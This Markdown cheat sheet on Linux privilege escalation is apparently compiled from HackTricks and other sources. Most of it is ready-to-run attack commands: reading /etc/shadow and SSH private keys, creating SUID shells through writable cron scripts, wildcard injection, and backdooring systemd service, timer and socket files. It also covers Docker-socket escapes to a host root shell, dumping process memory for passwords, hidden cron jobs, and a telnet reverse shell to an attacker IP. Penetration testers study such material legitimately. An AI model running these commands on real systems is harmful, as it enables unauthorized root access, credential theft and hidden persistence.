<h1>Linux Privelage escelation (Extended versrion)</h1>

#### DISCLAMER!: to clarify this information is not found by me, im just compiling things i find interesting in Advanced Linux Priv Esc, i will be putting citations to give credit to the other cheatsheets and websites i used to gather this informationa nd will be cited at the very end of this file

## Automatic Linux Priv Esc 


### tools:
* [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester.git)
* [linux-exploit-suggester2](https://github.com/mzet-/linux-exploit-suggester)
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
* [LaZagne](https://github.com/AlessandroZ/LaZagne)
* [Beeroot](https://github.com/AlessandroZ/BeRoot)
* [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [mimipenguin](https://github.com/huntergregal/mimipenguin)




<h3>Simple Manual Priv esc<h3>
<h4>User enumeration<h4>

<h4>Info about User<h4>
  
```
id || (whoami && groups) 2>/dev/null
id
```

<h4>List all users<h4>
  
```
cat /etc/passwd | cut -d: -f1
```

<h4>List superusers<h4>
  
```
awk -F: '($3 == "0") {print}' /etc/passwd
grep -v -E “^#” /etc/passwd | awk -F: ‘$3 == 0 { print $1}’
awk -F: ‘($3 == “0”) {print}’ /etc/passwd   
```

<h4>Currently logged users<h4>

```
w
```

<h4>OS info: <h4>

```(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null
```

Environmental info:
```
env
(env || set) 2>/dev/null
```

Kernal Exploit
```
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
You can find a good vulnerable kernel list and some already compiled exploits here: https://github.com/lucyoa/kernel-exploits and exploitdb sploits.
Other sites where you can find some compiled exploits: https://github.com/bwbwbwbw/linux-exploit-binaries, https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack


To extract all the vulnerable kernel versions from that web you can do:
```
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
Tools that could help searching for kernel exploits are:
linux-exploit-suggester.sh
linux-exploit-suggester2.pl
linuxprivchecker.py (execute IN victim,only checks exploits for kernel 2.x)
```
Always search the kernel version in Google, maybe your kernel version is wrote in some kernel exploit and then you will be sure that this exploit is valid.

Sudo version
Based on the vulnerable sudo versions that appear in:
```
searchsploit sudo
```
You can check if the sudo version is vulnerable using this grep.
```
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
More system enumeration
```
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

<h4>Drives<h4>
Check what is mounted and unmounted, where and why. If anything is unmounted you could try to mount it and check for private info

```ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
<h4>GTFOBins<h4>
GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
https://gtfobins.github.io/


The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

Installed SoftwareUseful software
Enumerate useful binaries
Vulnerable Software Installed
Check for the version of the installed packages and services. Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges… It is recommended to check manually the version of the more suspicious installed software.
```
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use openVAS to check for outdated and vulnerable software installed inside the machine.


<h4>Processes<h4>
  
```ps aux,
ps -ef,
top -n 1,
```
  
<h4>Process monitoring<h4>
You can use tools like [pspy](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.
  
<h4>Scheduled/Cron jobs<h4>
Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
  
```
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```



<h2>Advanced Manual Linux Priv Esc</h2>

<h3>Now moving onto the advanced part these will most likely not be seen but still can be useful </h3>


- Collect - Enumeration, more enumeration and some more enumeration
- process - sort through that data and analyse it
- Search - know what to search for and where to find the exploit code
- adapt - adapt customize the exploit, so it fits
- try - theres gonna be alot of trial and error



Enumeration of confidential information and Users

What sensitive files can you find?

```
* cat /etc/passwd
* cat /etc/group
* cat /etc/shadow
* ls -alh /var/mail/
* cat /etc/passwd | grep "sh$\|python"
* grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null

* #Passwd equivalent files
* cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
* #Shadow equivalent files
* cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```


Any plain text usernames and/or passwords?

```
* grep -i user [filename]
* grep -i pass [filename]
* grep -C 5 “password” [filename]
* find . -name “*.php” -print0 | xargs -0 grep -i -n “var $password”  # Joomla
```


Anything interesting in the home directory? If it’s possible to access.
```
* ls -ahlR /root/
* ls -ahlR /home/
```


Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?

```
#Info about me
*id || (whoami && groups) 2>/dev/null
*id

#List all users
*cat /etc/passwd | cut -d: -f1

#List users with console
*cat /etc/passwd | grep "sh$"

#List superusers
*awk -F: '($3 == "0") {print}' /etc/passwd
*grep -v -E “^#” /etc/passwd | awk -F: ‘$3 == 0 { print $1}’
*awk -F: ‘($3 == “0”) {print}’ /etc/passwd       

#Currently logged users
*w

#Login history
*last | tail

#Last log of each user
*lastlog


#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```


Clipboard
Check if anything interesting is located inside the clipboard (if possible)
```
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

Password Policy

```
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

Su Brute

If don't mind about doing a lot of noise and su and timeout binaries are present on the computer you can try to brute-force user using su-bruteforce. Linpeas with -a parameter also try to brute-force users.

Are there any passwords in; scripts, databases, configuration files or log files?

```
* cat /var/apache2/config.inc
* cat /var/lib/mysql/mysql/user.MYD
* cat /root/anaconda-ks.cfg
```


What user information can be found?

```
* cat ~/.bashrc
* cat ~/.profile
* cat /var/mail/root
* cat /var/spool/mail/root
```


Can private-key information be found?

```
* cat ~/.ssh/authorized_keys
* cat ~/.ssh/identity.pub
* cat ~/.ssh/identity
* cat ~/.ssh/id_rsa.pub
* cat ~/.ssh/id_rsa
* cat ~/.ssh/id_dsa.pub
* cat ~/.ssh/id_dsa
* cat /etc/ssh/ssh_config
* cat /etc/ssh/sshd_config
* cat /etc/ssh/ssh_host_dsa_key.pub
* cat /etc/ssh/ssh_host_dsa_key
* cat /etc/ssh/ssh_host_rsa_key.pub
* cat /etc/ssh/ssh_host_rsa_key
* cat /etc/ssh/ssh_host_key.pub
* cat /etc/ssh/ssh_host_key
```


Enumeration of the operating system

What is the distribution type, and version?

```
cat /etc/issue
cat /etc/*-release
    cat /etc/lsb-release      # Debian Based
    cat /etc/redhat-release   # Redhat Based
```


What is the Kernel version? is it 64-bit?

```
* dmesg | grep linux
* ls /boot | grep vmlinuz-
* cat /proc/version
* uname -a
* uname -mrs
* rpm -q kernel
```


what can we learnt from the environmental variables
```
* cat ~/.bash_profile
* cat ~/.bash_logout
* cat ~/.bashrc
* cat /etc/bashrc
* cat /etc/profile
* env
```



Enumeration of services and applications

pay attention to anything that runs as root

```
ps aux
ps -ef
top
cat /etc/services
```


what services are running on root?, and which are vulnerable?
```
ps aux | grep root
ps -ef | grep root
```

What applications are installed, and what versions? It might be worth to check if they are currently running

```
* dpkg -l
* ls -alh /var/cache/yum
* ls -alh /var/cache/apt/archivesO
* rpm -qa
* ls -alh /usr/bin
* ls -alh /sbin/
```


Do any of these services have vulnerable plugins or configurations.

```
* cat /etc/syslog.conf
* cat /etc/chttp.conf
* cat /etc/lighttpd.conf
* cat /etc/cups/cupsd.conf
* cat /etc/inetd.conf
* cat /etc/apache2/apache2.conf
* cat /etc/my.conf
* cat /etc/httpd/conf/httpd.conf
* cat /opt/lampp/etc/httpd.conf
* ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/
```




Enumeration of the file-systems

What configuration files can be read/written in /etc/ ?

```
* ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/’ 2>/dev/null # Anyone
* ls -aRl /etc/ | awk ‘$1 ~ /^..w/’ 2>/dev/null # Owner
* ls -aRl /etc/ | awk ‘$1 ~ /^…..w/’ 2>/dev/null # Group
* ls -aRl /etc/ | awk ‘$1 ~ /w.$/’ 2>/dev/null # Other
* find /etc/ -readable -type f 2>/dev/null # Anyone
* find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
```


What information can be found in /var/ ?

```
* ls -alh /var/log
* ls -alh /var/mail
* ls -alh /var/spool
* ls -alh /var/spool/lpd
* ls -alh /var/lib/pgsql
* ls -alh /var/lib/mysql
* cat /var/lib/dhcp3/dhclient.leases
```
Process memory

Some services of a server save credentials in clear text inside the memory. Normally you will need root privileges to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials. However, remember that as a regular user you can read the memory of the processes you own


GDB

If you have access to the memory of a FTP service (for example) you could get the Heap and search inside of it the credentials.
```
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```


Credentials from Process Memory

The tool https://github.com/huntergregal/mimipenguin will steal clear text credentials from memory and from some well known files. It requires root privileges to work properly.

Enumeration of communications and networking

What NICs does the system have?

```
* /sbin/ifconfig -a
* cat /etc/network/interfaces
* cat /etc/sysconfig/network
```


What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?

```
* cat /etc/resolv.conf
* cat /etc/sysconfig/network
* cat /etc/networks
* iptables -L
* hostname
* dnsdomainname
```

What other hosts are communicating with the system?

```
* lsof -i
* lsof -i :80
* grep 80 /etc/services
* netstat -antup
* netstat -antpx
* netstat -tulpn
* chkconfig –list
* chkconfig –list | grep 3:on
* last
* w
```

Are there any cached IP or MAC addresses?

```
* arp -e
* route
* /sbin/route -nee
```

Is packet sniffing possible, and if so what can be seen?

```
* tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
```

Is SSH tunnelling possible?

```
* ssh -D [IP]:[PORT] -N [username]@[ip]
* proxychains ifconfig
```
.
Have you got a shell? Can you interact with the system?

```
* nc -lvp 4444# Attacker. Input (Commands)
* nc -lvp 4445# Attacker. Ouput (Results)
* telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445# On the targets system. Use the attackers IP!
```


Is port forwarding possible? Redirect and interact with traffic from another view

```
* Syntax: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
* ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
* ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
* Syntax: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
* mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe # Port Relay
* mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)
* mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)
```

Network

It's always interesting to enumerate the network and figure out the position of the machine.
Generic enumeration

```
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```

Open ports

Always check network services running on the machine that you wasn't able to interact with before accessing to it:
```
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```

Sniffing

Check if you can sniff traffic. If you can, you could be able to grab some credentials.

```
timeout 1 tcpdump
```

Preparation for exploit code

What development tools/languages are installed/supported?
```
* find / -name perl*
* find / -name python*
* find / -name gcc*
* find / -name cc
```

How can files be uploaded
```
* find / -name wget
* find / -name nc*
* find / -name netcat*
* find / -name tftp*
* find / -name ftp
```


---

Stretch commands:
What are stretch commands?, they're commands that i honestly find a stretch to use


Scheduled/Cron jobs

Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```


Cron path


For example, inside /etc/crontab you can find the PATH: PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

(Note how the user "user" has writing privileges over /home/user)

If inside this crontab the root user tries to execute some command or script without setting the path. For example: * * * * root overwrite.sh Then, you can get a root shell by using

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```


Cron using a script with a wildcard (Wildcard Injection)

If a script being executed by root has a “*” inside a command, you could exploit this to make unexpected things (like privesc). Example:
```
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
If the wildcard is preceded of a path like /some/path/* , it's not vulnerable (even ./* is not).



Cron script overwriting and symlink

If you can modify a cron script executed by root, you can get a shell very easily:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
If the script executed by root uses a directory where you have full access, maybe it could be useful to delete that folder and create a symlink folder to another one serving a script controlled by you

```
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```


Frequent cron jobs


You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to monitor every 0.1s during 1 minute, sort by less executed commands and deleting the commands that have beeing executed all the time, you can do

```
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```


Invisible cron jobs

It's possible to create a cronjob putting a carriage return after a comment (without new line character), and the cron job will work. Example (note the carriege return char):
```
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
What jobs are scheduled?

```
* crontab -l
* ls -alh /var/spool/cron
* ls -al /etc/ | grep cron
* ls -al /etc/cron*
* cat /etc/cron*
* cat /etc/at.allow
* cat /etc/at.deny
* cat /etc/cron.allow
* cat /etc/cron.deny
* cat /etc/crontab
* cat /etc/anacrontab
* cat /var/spool/cron/crontabs/root
```

---
Services

Writable .service files


Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started, restarted or stopped (maybe you will need to wait until the machine is rebooted). For example create your backdoor inside the .service file with ExecStart=/tmp/script.sh

Writable service binaries


Keep in mid that if you have write permissions over binaries being executed by services, you can change them for backdoors so when the services get re-executed the backdoors will be executed.



systemd PATH - Relative Paths


You can see the PATH used by systemd with

```
systemctl show-environment
```
If you find that you can write in any of the folders of the path you may be able to escalate privileges. You need to search for relative paths being used on service configurations files like:

```
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Then, create a executable with the same name as the relative path binary inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (Start, Stop, Reload), your backdoor will be executed (unprivileged users usually cannot start/stop services but check if you can using sudo -l).

Learn more about services with man systemd.service.

---
Timers

Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron. Timers have built-in support for calendar time events, monotonic time events, and can be run asynchronously.

You can enumerate all the timers doing:

```
systemctl list-timers --all
```
Writable timers

If you can modify a timer you can make it execute some existent systemd.unit (like a .service or a .target)

```
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Therefore, in order to abuse this permissions you would need to:

- Find some systemd unit (like a .service) that is executing a writable binary
- Find some systemd unit that is executing a relative path and you have writable privileges over the systemd PATH (to impersonate that executable)

Learn more about timers with man systemd.timer.



Enabling Timer

In order to enable a timer you need root privileges and to execute:
```
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Note the timer is activated by creating a symlink to it on

```
/etc/systemd/system/<WantedBy_section>.wants/<name>.timer
```


---
Sockets

Writable .socket files

If you find a writable .socket file you can add at the begging of the [Socket] section something like:

```
ExecStartPre=/home/kali/sys/backdoor
```
and the backdoor will be executed before the socket is created. Therefore, you will probably need to wait until the machine is rebooted. Note that the system must be using that socket file configuration or the backdoor won't be executed



Writable sockets

If you identify any writable socket (now where are talking about Unix Sockets, not about the config .socket files), then, you can communicate with that socket and maybe exploit a vulnerability.

Enumerate Unix Sockets

```
netstat -a -p --unix
```


Raw connection

```
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket


#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

Exploitation example:

https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection



---
HTTP sockets

Note that there may be some sockets listening for HTTP requests (I'm not talking about .socket files but about the files acting as unix sockets). You can check this with:

```
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket respond with a HTTP request, then you can communicate with it and maybe exploit some vulnerability.



Writable Docker Socket

The docker socket is typically located at /var/run/docker.sock and is only writable by root user and docker group. If for some reason you have write permissions over that socket you can escalate privileges. The following commands can be used to escalate privileges
```
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```


Use docker web API from socket without docker package


If you have access to docker socket but you can't use the docker binary (maybe it isn't even installed), you can use directly the web API with curl.

The following commands are a example to create a docker container that mount the root of the host system and use socat to execute commands into the new docker

```
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
##[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
##{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

The last step is to use socat to initiate a connection to the container, sending an attach request

```
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp


#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
Now, you can execute commands on the container from this socat connection.



Others

Note that if you have write permissions over the docker socket because you are inside the group docker you have more ways to escalate privileges.


---
D-Bus

D-Bus use an allow/deny model, where each message (method call, signal emission, etc.) can be allowed or denied according to the sum of all policy rules which match it. Each or rule in the policy should have the own, send_destination or receive_sender attribute set.

Part of the policy of /etc/dbus-1/system.d/wpa_supplicant.conf

```
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
Therefore, if a policy is allowing your user in anyway to interact with the bus, you could be able to exploit it to escalate privileges (maybe just listing for some passwords?).

Note that a policy that doesn't specify any user or group affects everyone (<policy>). Policies to the context "default" affects everyone not affected by other policies (<policy context="default").

Learn how to enumerate and exploit a D-Bus communication here:

https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation





Identify SUID and GUID files

```
* find / -perm -1000 -type d 2>/dev/null # Sticky bit – Only the owner of the directory or the owner of a file can delete or rename here.
* find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) – run as the group, not the user who started it.
* find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) – run as the owner, not the user who started it.
* find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID
* for i in `locate -r “bin$”`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done # Looks in ‘common’ places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
* find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
```

Where can written to and executed from? A few ‘common’ places: /tmp, /var/tmp, /dev/shm

```
* find / -writable -type d 2>/dev/null # world-writeable folders
* find / -perm -222 -type d 2>/dev/null # world-writeable folders
* find / -perm -o w -type d 2>/dev/null # world-writeable folders
* find / -perm -o x -type d 2>/dev/null # world-executable folders
* find / \( -perm -o w -perm -o x \) -type d 2>/dev/null # world-writeable & executable folders
```

Any “problem” files? Word-writeable, “nobody” files

```
* find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print # world-writeable files
* find /dir -xdev \( -nouser -o -nogroup \) -print # Noowner files
```


If commands are limited, you break out of the “jail” shell AKA TTY shell?

```
* python -c ‘import pty;pty.spawn(“/bin/bash”)’
* echo os.system(‘/bin/bash’)
* /bin/sh -i
```

How many file-systems mounted
```
* mount
* df -h
```

Are there any unmounted file-systems?

```
* cat /etc/fstab
```


Any settings/files (hidden) on website? Any settings file with database information?
```
* ls -alhR /var/www/
* ls -alhR /srv/www/htdocs/
* ls -alhR /usr/local/www/apache22/data/
* ls -alhR /opt/lampp/htdocs/
* ls -alhR /var/www/html/
```

Identify world-readable and world-writable files ! *

Where can written to and executed from? A few ‘common’ places: /tmp, /var/tmp, /dev/shm

```
* find / -writable -type d 2>/dev/null # world-writeable folders
* find / -perm -222 -type d 2>/dev/null # world-writeable folders
* find / -perm -o w -type d 2>/dev/null # world-writeable folders
* find / -perm -o x -type d 2>/dev/null # world-executable folders
* find / \( -perm -o w -perm -o x \) -type d 2>/dev/null # world-writeable & executable folders
```


Process Memory
GDB;
/proc/$pid/maps & /proc/$pid/mem

For a given process ID, maps shows how memory is mapped within that processes' virtual address space; it also shows the permissions of each mapped region. The mem pseudo file exposes the processes memory itself. From the maps file we know which memory regions are readable and their offsets. We use this information to seek into the mem file and dump all readable regions to a file.
```
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```
/dev/mem

/dev/mem provides access to the system's physical memory, not the virtual memory. The kernels virtual address space can be accessed using /dev/kmem. Typically, /dev/mem is only readable by root and kmem group.
```
strings /dev/mem -n10 | grep -i PASS
```



Long texts commands:
Is there anything in the log file(s) (Could help with “Local File Includes”!)

```
* cat /etc/httpd/logs/access_log
* cat /etc/httpd/logs/access.log
* cat /etc/httpd/logs/error_log
* cat /etc/httpd/logs/error.log
* cat /var/log/apache2/access_log
* cat /var/log/apache2/access.log
* cat /var/log/apache2/error_log
* cat /var/log/apache2/error.log
* cat /var/log/apache/access_log
* cat /var/log/apache/access.log
* cat /var/log/auth.log
* cat /var/log/chttp.log
* cat /var/log/cups/error_log
* cat /var/log/dpkg.log
* cat /var/log/faillog
* cat /var/log/httpd/access_log
* cat /var/log/httpd/access.log
* cat /var/log/httpd/error_log
* cat /var/log/httpd/error.log
* cat /var/log/lastlog
* cat /var/log/lighttpd/access.log
* cat /var/log/lighttpd/error.log
* cat /var/log/lighttpd/lighttpd.access.log
* cat /var/log/lighttpd/lighttpd.error.log
* cat /var/log/messages
* cat /var/log/secure
* cat /var/log/syslog
* cat /var/log/wtmp
* cat /var/log/xferlog
* cat /var/log/yum.log
* cat /var/run/utmp
* cat /var/webmin/miniserv.log
* cat /var/www/logs/access_log
* cat /var/www/logs/access.log
* ls -alh /var/lib/dhcp3/
* ls -alh /var/log/postgresql/
* ls -alh /var/log/proftpd/
* ls -alh /var/log/samba/
* Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
* Source: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
```


---
A explanations

Sockets
In brief, a Unix Socket (technically, the correct name is Unix domain socket, UDS) allows communication between two different processes on either the same machine or different machines in client-server application frameworks. To be more precise, it’s a way of communicating among computers using a standard Unix descriptors file. (From here).

Sockets can be configured using .socket files, Learn more about sockets with man systemd.socket. Inside this file some several interesting parameters can be configured:

- ListenStream, ListenDatagram, ListenSequentialPacket, ListenFIFO, ListenSpecial, ListenNetlink, ListenMessageQueue, ListenUSBFunction: This options are different but as summary as used to indicate where is going to listen the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen...).
- Accept: Takes a boolean argument. If true, a service instance is spawned for each incoming connection and only the connection socket is passed to it. If false, all listening sockets themselves are passed to the started service unit, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. Defaults to false. For performance reasons, it is recommended to write new daemons only in a way that is suitable for Accept=no.
- ExecStartPre, ExecStartPost: Takes one or more command lines, which are executed before or after the listening sockets/FIFOs are created and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- ExecStopPre, ExecStopPost: Additional commands that are executed before or after the listening sockets/FIFOs are closed and removed, respectively.
- Service: Specifies the service unit name to activate on incoming traffic. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.


D-Bus


D-BUS is an inter-process communication (IPC) system, providing a simple yet powerful mechanism allowing applications to talk to one another, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.

D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think UNIX domain sockets on steroids. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth dæmon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. **(From here).

D-Bus use an allow/deny model, where each message (method call, signal emission, etc.) can be allowed or denied according to the sum of all policy rules which match it. Each or rule in the policy should have the own, send_destination or receive_sender attribute set.



Citations:
https://book.hacktricks.xyz/linux-unix/privilege-escalation

